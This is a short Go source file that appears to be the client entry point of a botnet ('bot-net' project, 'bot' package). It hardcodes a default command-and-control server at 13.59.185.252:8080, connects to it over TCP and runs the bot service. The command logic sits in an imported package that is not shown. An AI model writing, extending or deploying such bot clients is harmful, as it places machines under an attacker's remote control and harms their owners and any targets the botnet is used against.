package main

import (
	"flag"
	"log"

	"github.com/phanletrunghieu/bot-net/bot/service/tcp"
)

func main() {
	serverPtr := flag.String("s", "13.59.185.252", "server address")
	flag.Parse()

	tcpService := tcp.NewTCPService(*serverPtr, 8080)
	go func() {
		err := <-tcpService.Error
		log.Println(err)
	}()

	log.Println("Connected!")

	tcpService.Run()
}
